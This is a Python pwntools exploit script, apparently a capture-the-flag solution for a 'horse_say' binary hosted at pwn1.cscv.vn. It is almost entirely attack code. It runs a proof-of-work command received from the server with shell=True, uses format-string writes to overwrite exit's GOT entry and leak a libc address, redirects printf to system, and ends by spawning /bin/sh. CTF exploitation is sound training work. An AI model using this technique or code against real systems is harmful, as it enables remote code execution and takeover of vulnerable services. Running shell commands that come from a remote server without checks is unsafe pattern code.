#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./horse_say_patched", checksec=False)
libc = ELF("libc.so.6")

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("pwn1.cscv.vn", 6789)
    else: 
        return process()
def GDB():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
        gdb.attach(p, gdbscript='''
            b*0x000000000040145A
            c
	    ''')
p = conn()
GDB()

p.recvuntil(b"proof of work: ")
cmd = p.recvline()
proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
pow_solution = proc.stdout.strip()
print("PoW solution:", pow_solution)
sla(b"solution: ", pow_solution)

payload = f"%{0x12d9}c%17$hn%143$p".encode()
payload = payload.ljust(40, b'A')
payload += p64(exe.got.exit)
sla(b"Say something: ", payload)

p.recvuntil(b"0x")
libc_leak = info(int(p.recv(12), 16), "libc leak")
libc.address = info(libc_leak - 0x2a1ca, "libc base")

info(libc.sym.system)
libc1 = info(libc.sym.system & 0xff, "libc1")
libc2 = info(libc.sym.system >> 8 & 0xffff, "libc2")
payload = f"%{libc1}c%17$hhn".encode()
payload += f"%{libc2 - libc1}c%18$hn".encode()
payload = payload.ljust(40, b'A')
payload += p64(exe.got.printf)
payload += p64(exe.got.printf + 1)
sla(b"Say something: ", payload)

sl(b"/bin/sh\0")
p.interactive()
